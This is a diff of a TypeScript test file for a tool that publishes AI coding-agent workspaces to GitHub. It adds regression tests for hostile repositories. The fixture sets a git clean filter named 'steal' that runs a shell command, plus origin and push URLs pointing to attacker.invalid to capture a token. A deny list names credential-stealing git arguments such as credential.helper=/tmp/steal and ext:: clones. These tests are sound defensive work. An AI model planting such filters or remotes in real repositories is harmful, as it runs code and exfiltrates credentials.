@@ -1,5 +1,6 @@
 import path from 'node:path';
 import fs from 'node:fs';
+import os from 'node:os';
 import { spawnSync } from 'node:child_process';
 import { createHash } from 'node:crypto';
 
@@ -48,6 +49,71 @@ function missingError(): NodeJS.ErrnoException {
 
 function gitResult(stdout = '', stderr = '', exitCode = 0) {
   return { stdout, stderr, exitCode };
+}
+
+function createHostGitExploitFixture(): {
+  root: string;
+  workspace: string;
+  marker: string;
+  git: GitTransport;
+  pushes: readonly string[][];
+} {
+  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'nanocrab-publish-test-'));
+  const exploitWorkspace = path.join(root, 'repo');
+  const marker = path.join(root, 'filter-executed');
+  fs.mkdirSync(exploitWorkspace);
+  const run = (args: readonly string[]) => {
+    const result = spawnSync('git', [...args], {
+      cwd: exploitWorkspace,
+      encoding: 'utf8',
+    });
+    if (result.status !== 0) {
+      throw new Error(result.stderr || `git ${args.join(' ')} failed`);
+    }
+    return result.stdout;
+  };
+  run(['init', '-q']);
+  run(['config', 'user.email', 'test@example.com']);
+  run(['config', 'user.name', 'NanoCrab Test']);
+  fs.writeFileSync(path.join(exploitWorkspace, 'payload.txt'), 'baseline\n');
+  run(['add', 'payload.txt']);
+  run(['commit', '-qm', 'baseline']);
+  run(['checkout', '-qb', 'nanocrab/issue-129']);
+  fs.writeFileSync(
+    path.join(exploitWorkspace, '.gitattributes'),
+    'payload.txt filter=steal\n',
+  );
+  fs.writeFileSync(path.join(exploitWorkspace, 'payload.txt'), 'changed\n');
+  run(['config', 'filter.steal.clean', `sh -c 'touch "${marker}"; cat'`]);
+  run(['config', 'filter.steal.required', 'true']);
+  run(['remote', 'add', 'origin', 'https://attacker.invalid/fetch.git']);
+  run([
+    'remote',
+    'set-url',
+    '--push',
+    'origin',
+    'https://attacker.invalid/steal-token.git',
+  ]);
+
+  const pushes: string[][] = [];
+  const git = vi.fn<GitTransport>(async (args, options) => {
+    if (args[0] === 'push') {
+      pushes.push([...args]);
+      return gitResult();
+    }
+    const result = spawnSync('git', [...args], {
+      cwd: options.cwd,
+      env: options.env,
+      encoding: 'utf8',
+      input: (options as { stdin?: string }).stdin,
+    });
+    return gitResult(
+      result.stdout || '',
+      result.stderr || '',
+      result.status ?? 1,
+    );
+  });
+  return { root, workspace: exploitWorkspace, marker, git, pushes };
 }
 
 function baseDeps(
@@ -110,9 +176,16 @@ function localCheckoutGit() {
 describe('coding workspace', () => {
   it('publishes changes only through hardened local Git and approved askpass push', async () => {
     const assertOwnership = vi.fn();
-    const git = vi.fn<GitTransport>(async (args) =>
-      gitResult(args[0] === 'rev-parse' ? 'abc123def456\n' : ''),
-    );
+    const treeId = 'a'.repeat(40);
+    const parentSha = 'b'.repeat(40);
+    const commitSha = 'c'.repeat(40);
+    const git = vi.fn<GitTransport>(async (args) => {
+      if (args[0] === 'symbolic-ref') return gitResult('nanocrab/issue-129\n');
+      if (args[0] === 'write-tree') return gitResult(`${treeId}\n`);
+      if (args[0] === 'rev-parse') return gitResult(`${parentSha}\n`);
+      if (args[0] === 'commit-tree') return gitResult(`${commitSha}\n`);
+      return gitResult();
+    });
     const dispose = vi.fn(async () => undefined);
     const createAskpass = vi.fn(async () => ({
       path: '/private/tmp/askpass/helper.sh',
@@ -122,6 +195,7 @@ describe('coding workspace', () => {
     const result = await publishCodingWorkspace(
       {
         workspace,
+        repo: 'owner/repo',
         branch: 'nanocrab/issue-129',
         commitMessage: 'fix: publish safely',
         token,
@@ -130,20 +204,33 @@ describe('coding workspace', () => {
       { git, createAskpass },
     );
 
-    expect(result).toEqual({ commitSha: 'abc123def456' });
+    expect(result).toEqual({ commitSha });
     expect(git.mock.calls.map(([args]) => args)).toEqual([
-      ['add', '-A'],
-      ['commit', '--no-verify', '-m', 'fix: publish safely'],
+      ['ls-files', '--stage', '--cached', '-z'],
+      ['ls-files', '--others', '--exclude-standard', '-z'],
+      ['update-index', '-z', '--index-info'],
+      ['symbolic-ref', '--quiet', '--short', 'HEAD'],
+      ['write-tree'],
       ['rev-parse', '--verify', 'HEAD'],
       [
+        'commit-tree',
+        treeId,
+        '-p',
+        parentSha,
+        '--no-gpg-sign',
+        '-m',
+        'fix: publish safely',
+      ],
+      ['update-ref', 'refs/heads/nanocrab/issue-129', commitSha, parentSha],
+      [
         'push',
-        'origin',
+        'https://github.com/owner/repo.git',
         'nanocrab/issue-129:refs/heads/nanocrab/issue-129',
         '--force-with-lease',
       ],
     ]);
-    expect(assertOwnership).toHaveBeenCalledTimes(4);
-    for (const [, options] of git.mock.calls.slice(0, 3)) {
+    expect(assertOwnership).toHaveBeenCalledTimes(10);
+    for (const [, options] of git.mock.calls.slice(0, -1)) {
       expect(options.env).toMatchObject({
         PATH: '/usr/local/bin:/usr/bin:/bin',
         GIT_CONFIG_SYSTEM: '/dev/null',
@@ -170,7 +257,7 @@ describe('coding workspace', () => {
         ]),
       );
     }
-    expect(git.mock.calls[3][1].env).toMatchObject({
+    expect(git.mock.calls.at(-1)![1].env).toMatchObject({
       GIT_ASKPASS: '/private/tmp/askpass/helper.sh',
       NANOCRAB_GIT_TOKEN: token,
     });
@@ -186,6 +273,7 @@ describe('coding workspace', () => {
       publishCodingWorkspace(
         {
           workspace,
+          repo: 'owner/repo',
           branch: 'nanocrab/issue-129',
           commitMessage: 'fix: publish safely',
           token,
@@ -193,11 +281,12 @@ describe('coding workspace', () => {
         },
         { git },
       ),
-    ).rejects.toThrow('Git staging failed');
+    ).rejects.toThrow('Git tracked-file inventory failed');
     await expect(
       publishCodingWorkspace(
         {
           workspace,
+          repo: 'owner/repo',
           branch: 'nanocrab/issue-129',
           commitMessage: 'fix: publish safely',
           token,
@@ -208,26 +297,121 @@ describe('coding workspace', () => {
     ).rejects.not.toThrow(token);
   });
 
+  it('stages model-written attributes without executing repository clean filters', async () => {
+    const fixture = createHostGitExploitFixture();
+    try {
+      await publishCodingWorkspace(
+        {
+          workspace: fixture.workspace,
+          repo: 'owner/repo',
+          branch: 'nanocrab/issue-129',
+          commitMessage: 'fix: safe staging',
+          token,
+          assertOwnership: vi.fn(),
+        },
+        {
+          git: fixture.git,
+          createAskpass: async () => ({
+            path: '/private/tmp/askpass/helper.sh',
+            dispose: async () => undefined,
+          }),
+        },
+      );
+
+      expect(fs.existsSync(fixture.marker)).toBe(false);
+      expect(
+        spawnSync('git', ['show', 'HEAD:payload.txt'], {
+          cwd: fixture.workspace,
+          encoding: 'utf8',
+        }).stdout,
+      ).toBe('changed\n');
+    } finally {
+      fs.rmSync(fixture.root, { recursive: true, force: true });
+    }
+  });
+
+  it('collects host evidence without executing repository clean filters', async () => {
+    const fixture = createHostGitExploitFixture();
+    try {
+      await collectCodingWorkspaceEvidence(fixture.workspace, {
+        git: fixture.git,
+      });
+
+      expect(fs.existsSync(fixture.marker)).toBe(false);
+    } finally {
+      fs.rmSync(fixture.root, { recursive: true, force: true });
+    }
+  });
+
+  it('ignores mutable origin and pushurl when publishing an approved repository', async () => {
+    const fixture = createHostGitExploitFixture();
+    try {
+      await publishCodingWorkspace(
+        {
+          workspace: fixture.workspace,
+          repo: 'owner/repo',
+          branch: 'nanocrab/issue-129',
+          commitMessage: 'fix: trusted remote',
+          token,
+          assertOwnership: vi.fn(),
+        },
+        {
+          git: fixture.git,
+          createAskpass: async () => ({
+            path: '/private/tmp/askpass/helper.sh',
+            dispose: async () => undefined,
+          }),
+        },
+      );
+
+      expect(fixture.pushes).toEqual([
+        [
+          'push',
+          'https://github.com/owner/repo.git',
+          'nanocrab/issue-129:refs/heads/nanocrab/issue-129',
+          '--force-with-lease',
+        ],
+      ]);
+    } finally {
+      fs.rmSync(fixture.root, { recursive: true, force: true });
+    }
+  });
+
   it('collects fresh credential-free host Git evidence after a Devin run', async () => {
+    const originalObject = 'a'.repeat(40);
+    const changedObject = 'b'.repeat(40);
+    const untrackedObject = 'c'.repeat(40);
     const git = vi.fn<GitTransport>(async (args) => {
-      if (args.join(' ') === 'diff --no-ext-diff --no-textconv --stat HEAD') {
-        return gitResult('src/a.ts | 2 ++\n');
+      if (args.join(' ') === 'ls-files --stage --cached -z') {
+        return gitResult(`100644 ${originalObject} 0\tsrc/a.ts\0`);
       }
-      if (
-        args.join(' ') === 'diff --no-ext-diff --no-textconv --name-only HEAD'
-      ) {
-        return gitResult('src/a.ts\n');
+      if (args.join(' ') === 'ls-files --others --exclude-standard -z') {
+        return gitResult('src/new.ts\0');
       }
-      if (args.join(' ') === 'ls-files --others --exclude-standard') {
-        return gitResult('src/new.ts\n');
+      if (args[0] === 'hash-object') {
+        return gitResult(
+          `${args.at(-1) === 'src/a.ts' ? changedObject : untrackedObject}\n`,
+        );
+      }
+      if (args[0] === 'diff' && args[1] === '--cached') {
+        return gitResult();
       }
       throw new Error(`unexpected fake Git call: ${args.join(' ')}`);
     });
 
-    const evidence = await collectCodingWorkspaceEvidence(workspace, { git });
+    const evidence = await collectCodingWorkspaceEvidence(workspace, {
+      git,
+      lstat: async () =>
+        ({
+          isDirectory: () => false,
+          isSymbolicLink: () => false,
+          isFile: () => true,
+          mode: 0o100644,
+        }) as fs.Stats,
+    });
 
     expect(evidence).toEqual({
-      diffStat: 'src/a.ts | 2 ++',
+      diffStat: '2 files changed (filter-free evidence)',
       changedFiles: ['src/a.ts'],
       untrackedFiles: ['src/new.ts'],
       testEvidence: {
@@ -237,9 +421,18 @@ describe('coding workspace', () => {
       },
     });
     expect(git.mock.calls.map(([args]) => args)).toEqual([
-      ['diff', '--no-ext-diff', '--no-textconv', '--stat', 'HEAD'],
-      ['diff', '--no-ext-diff', '--no-textconv', '--name-only', 'HEAD'],
-      ['ls-files', '--others', '--exclude-standard'],
+      ['ls-files', '--stage', '--cached', '-z'],
+      ['ls-files', '--others', '--exclude-standard', '-z'],
+      ['hash-object', '--no-filters', '--', 'src/a.ts'],
+      ['hash-object', '--no-filters', '--', 'src/new.ts'],
+      [
+        'diff',
+        '--cached',
+        '--no-ext-diff',
+        '--no-textconv',
+        '--name-only',
+        'HEAD',
+      ],
     ]);
     for (const [, options] of git.mock.calls) {
       expect(options.cwd).toBe(workspace);
@@ -578,12 +771,12 @@ describe('coding workspace', () => {
     }));
 
     const result = await runApprovedHostGit(
-      ['push', 'origin', 'nanocrab/issue-129'],
+      ['push', 'https://github.com/owner/repo.git', 'nanocrab/issue-129'],
       { cwd: workspace, token, git, createAskpass },
     );
 
     expect(git).toHaveBeenCalledWith(
-      ['push', 'origin', 'nanocrab/issue-129'],
+      ['push', 'https://github.com/owner/repo.git', 'nanocrab/issue-129'],
       expect.objectContaining({
         cwd: workspace,
         timeoutMs: 120_000,
@@ -608,12 +801,15 @@ describe('coding workspace', () => {
       dispose: vi.fn(async () => undefined),
     }));
 
-    await runApprovedHostGit(['push', 'origin', 'nanocrab/issue-129'], {
-      cwd: workspace,
-      token,
-      git,
-      createAskpass,
-    });
+    await runApprovedHostGit(
+      ['push', 'https://github.com/owner/repo.git', 'nanocrab/issue-129'],
+      {
+        cwd: workspace,
+        token,
+        git,
+        createAskpass,
+      },
+    );
 
     const env = git.mock.calls[0][1].env;
     expect(env).toMatchObject({
@@ -649,6 +845,7 @@ describe('coding workspace', () => {
     [['-c', 'credential.helper=/tmp/steal', 'fetch', 'origin', 'main']],
     [['fetch', '--upload-pack=/tmp/steal', 'origin', 'main']],
     [['push', '--receive-pack=/tmp/steal', 'origin', 'main']],
+    [['push', 'origin', 'main']],
     [['clone', 'ext::/tmp/steal', workspace]],
   ])('rejects unapproved credentialed Git argv %j', async (args) => {
     const git = vi.fn<GitTransport>();
@@ -664,11 +861,11 @@ describe('coding workspace', () => {
   it.each([
     [
       'push',
-      'origin',
+      'https://github.com/owner/repo.git',
       'nanocrab/issue-129:refs/heads/nanocrab/issue-129',
       '--force-with-lease',
     ],
-    ['push', 'origin', ':nanocrab/issue-129'],
+    ['push', 'https://github.com/owner/repo.git', ':nanocrab/issue-129'],
   ])('allows the exact approved NanoCrab push argv %j', async (...args) => {
     const git = vi.fn<GitTransport>(async () => gitResult());
     const dispose = vi.fn(async () => undefined);
@@ -806,11 +1003,14 @@ describe('coding workspace', () => {
       throw new Error(`transport leaked ${token}`);
     });
     await expect(
-      runApprovedHostGit(['push', 'origin', 'main'], {
-        token,
-        git: throwingGit,
-        createAskpass,
-      }),
+      runApprovedHostGit(
+        ['push', 'https://github.com/owner/repo.git', 'main'],
+        {
+          token,
+          git: throwingGit,
+          createAskpass,
+        },
+      ),
     ).rejects.not.toThrow(token);
     expect(dispose).toHaveBeenCalledTimes(2);
   });
